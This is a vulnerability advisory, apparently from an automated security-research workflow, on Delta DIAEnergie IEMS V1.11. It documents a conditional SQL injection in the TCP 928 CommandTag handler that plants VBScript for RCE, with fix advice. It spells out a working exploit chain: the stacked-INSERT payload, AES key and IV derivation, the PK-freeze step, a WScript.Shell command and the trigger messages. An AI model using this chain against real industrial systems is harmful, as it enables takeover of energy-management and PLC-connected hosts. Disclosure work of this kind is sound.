# Delta DIAEnergie IEMS V1.11 — Authenticated CommandTag SQL Injection → VBScript → RCE

## 1. Overview

Delta DIAEnergie IEMS (Industrial Energy Management System) is a closed-source industrial EMS by Delta Electronics used to monitor and manage electrical energy in manufacturing and industrial facilities. The engineering-station communication service `CEBC.exe` (.NET Framework PE32 x86 WinForms) listens on TCP 928 with a raw-socket protocol. The `API.CommandTag` method concatenates the `tid` parameter verbatim into a SQL Server query (CWE-89). Using T-SQL's semicolon-free stacked-statement syntax, an attacker injects a row into the `DIAE_script` table containing attacker-controlled VBScript; the `RecalculateScript` trigger then executes every row of that table through the MSScriptControl COM engine (CWE-94), achieving command execution in the CEBC service context.

The TCP 928 protocol has **no user authentication** — the only gate is the AES-256-CBC encryption key `Define.PK`, which is randomly regenerated on a ~30-second rotation. The attacker needs DB read access (or another leak path) to freeze/obtain the key, making this a Target B (conditional/authenticated) RCE. Verified end-to-end with `whoami > C:\Windows\Temp\m.txt` executed by the CEBC service account.

## 2. Vulnerability Summary

- **Type**: Authenticated (conditional) SQL injection → VBScript execution → RCE
- **Root cause 1 (CWE-89)**: `API.CommandTag` splices `tid` into the SQL query without parameterization, quoting, or `int.TryParse`
- **Root cause 2 (CWE-94)**: `RecalculateScript()` reads all `DIAE_script` rows (no WHERE) and executes them as VBScript via MSScriptControl `AddCode`
- **Root cause 3 (CWE-306)**: the TCP 928 protocol has no user authentication — only an encryption key gates access
- **Result**: attacker with the PK (via DB read or leak) → SQLi INSERT → VBScript row → `RecalculateScript` trigger → RCE as CEBC service account. CVSS 8.8.

## 3. Authentication Boundary

The TCP 928 dispatcher (`Class40.method_0`, Class40.cs:30-75) accepts a raw socket, receives up to 1024 bytes, AES-256-CBC-decrypts with `Define.PK`, and splits the plaintext on `;`. A grep for auth/login/token/password/session/check in the dispatcher returns zero hits — there is **no user authentication** on the protocol.

The only gate is the encryption key `Define.PK`. `Define.KeyID = Guid.NewGuid().ToString("n").Substring(0,16)` (random) and `PK = Base64(SHA256(KeyID+timestamp))` (random). PK is regenerated on a ~30-second cycle when `DIAE_sts.pmt != "0"`; the attacker can freeze it by setting `pmt='0'` (requires DB write access) or by sending within the sub-second rotation window. PK is stored in the `DIAE_pmt` table (DB-readable) — hence Target B (conditional RCE) rather than unauthenticated.

## 4. Attack Surface

- **Entry**: TCP 928 raw socket → `Class40.method_0` → `API.CommandTag(array2[0], array2[1])`
- **Controllable**: `tid` (SQLi vector) and `Data` (PLC write path, not SQL)
- **Sink 1**: `CommandTag` SQL concatenation (API.cs:2036-2050)
- **Sink 2**: `RecalculateScript` VBScript execution (RecalculateScriptClass.cs:179-208)
- **Prior patched CVEs**: `RecalculateHDMWYC`, `RecalculateHDMWYC_DIACloud`, and "ICS Restart!" handlers have `int.TryParse`+`DateTime.TryParse` gates in V1.11; `CommandTag` does **not** — an independent 0-day, not a variant

## 5. Sink Identification

**SQL sink** (`/CEBC/API.cs:2036-2050`):

```csharp
public static bool CommandTag(string tid, string Data)
{
    ...
    DataTable dataTable = val.GetDataTable(
        "SELECT DIAE_eq.pt,... FROM DIAE_eq INNER JOIN DIAE_tag ON DIAE_eq.eid=DIAE_tag.eid "
        + "WHERE tid=" + tid + " AND DIAE_tag.del='0' ... AND DIAE_tag.kid='" + Define.KeyID + "' ...",
        new string[0]);
    ...
}
```

`tid` is raw-concatenated into `WHERE tid=`, with `new string[0]` confirming no parameterized arguments. `Data` does not enter SQL.

**VBScript sink** (`/CEBC/RecalculateScriptClass.cs:179-208`):

```csharp
public void RecalculateScript()
{
    ...
    DataTable dataTable = diaenergieSQLHandleClass_0.GetDataTable(
        "SELECT scid,name,script FROM DIAE_script", new string[0]);   // no WHERE, full table
    if (dataTable.Rows.Count == 0) return;
    iscriptControl_0.Language = "VBScript";
    foreach (DataRow row in dataTable.Rows) {
        ...
        iscriptControl_0.AddCode(row["script"].ToString());           // executes VBScript
    }
}
```

The constructor instantiates MSScriptControl COM (`CLSID 0E59F1D5-1FBE-11D0-8FF2-00A0D10038BC`). `AddCode` executes attacker-controlled VBScript directly. The trigger `RecalculateScript~<start>~<end>~<int>` passes an integer `~1` through the `int.TryParse` gate.

## 6. Source Identification & Controllability

The SQL injection source is the `tid` field (`array2[0]`) of the TCP 928 message. The attacker controls it byte-for-byte before AES encryption. The VBScript source is the `script` column of `DIAE_script`, populated by the injected `INSERT` (also attacker-controlled).

## 7. Data Flow

```
Attacker --TCP 928--> CEBC.exe
  Step 1 plaintext: `9999 INSERT INTO DIAE_script(name,script,kid) VALUES(N'pwn',N'<VBS>',N'0') --;1`
    → AES(PK) encrypt → send
    → Class40.method_0: AES(PK) decrypt → split(';') count==2 → CommandTag(tid,Data)
    → tid raw-spliced into SQL → semicolon-free stacked INSERT → DIAE_script row planted (response "1")
  Step 2 plaintext: `RecalculateScript~2020-01-01~2020-01-02~1`
    → AES(PK) encrypt → send
    → StartsWith("RecalculateScript") branch → RecalculateScript()
    → SELECT * FROM DIAE_script (full table) → AddCode(VBS) → WScript.Shell.Run → cmd → RCE
    → whoami > C:\Windows\Temp\m.txt (response "Recalculate Script Start!")
```

## 8. Exploit Construction

### 8.1 Semicolon constraint

The protocol `Split(';')` requires the plaintext to contain exactly one `;`. Classic semicolon-stacked SQL would be broken by the protocol split. The bypass: **T-SQL allows statement stacking without semicolons** (`SELECT ... WHERE tid=9999 INSERT INTO ...` — both statements execute). Verified on a real SQL Server.

The `tid` becomes:

```sql
9999 INSERT INTO DIAE_script(name,script,kid) VALUES(N'pwn',N'<VBScript>',N'0') --
```

with the plaintext `tid + ";1"` containing exactly one `;` (the tid/data separator).

### 8.2 PK freeze

Set `DIAE_sts.pmt='0'` (requires DB access) so `Main.cs:992` stops regenerating the PK; `Define.PK` freezes (verified stable 35 s+). Alternatively send within the sub-second rotation window after reading the PK.

### 8.3 AES parameters

`AesCryptoServiceProvider`, AES-256-CBC, PKCS7; Key=`SHA256(PK)`[32], IV=`MD5(PK)`[16], Base64. The Python implementation (`sha256(pk)` + `md5(pk)`) matched the .NET behavior.

### 8.4 Planted VBScript

```vbscript
Call CreateObject("WScript.Shell").Run("cmd /c whoami > C:\Windows\Temp\m.txt", 0, True)
```

## 9. Dynamic Verification

Environment: Windows Server 2025, SQL Server 2022 Express (`DIAEnergie` DB), CEBC.exe running as administrator.

.NET-native verification (PK frozen + immediate send):

```
- set pmt='0' + read PK = <PK>
- PING CPUCounter → response 0 (handler alive, PK correct)
- STEP1 CommandTag SQLi → response 1
- STEP2 RecalculateScript → response "Recalculate Script Start!"
- C:\Windows\Temp\m.txt = <host>\administrator, LASTWRITE=recent (fresh)
```

Python script first run (via SSH tunnel):

```
- STEP1 → response b'1'
- STEP2 → response b'Recalculate Script Start!'
- marker <host>\administrator (independently confirmed fresh by the falsifier subagent)
```

## 10. Reachability & Impact

- **Reachability**: TCP 928 is network-reachable; the SQLi and trigger require the AES PK, obtainable with DB read access or another leak path (Target B). No unauthenticated PK leak path was found (FUE gate passed, Target A excluded).
- **Impact**: arbitrary VBScript/command execution as the CEBC service account — energy-management data, PLC connectivity, and the engineering station under attacker control; in industrial facilities this can disrupt energy monitoring and reporting.

## 11. Fix Recommendations

1. Add `int.TryParse` validation and parameterized queries to `CommandTag`, consistent with the patched `Recalculate*` handlers.
2. Add a `kid`/`scid` WHERE filter to `RecalculateScript()`, consistent with `RecalculateScriptNew()`.
3. Introduce an authentication layer to the TCP 928 protocol (currently encryption-key-only).
4. Whitelist/sandbox VBScript before executing `DIAE_script` rows.

## 12. CWE & CVSS

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL injection)
- **CWE-94**: Improper Control of Generation of Code (VBScript execution via MSScriptControl)
- **CWE-306**: Missing Authentication for Critical Function (TCP 928 protocol)
- **CVSS**: 8.8 — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
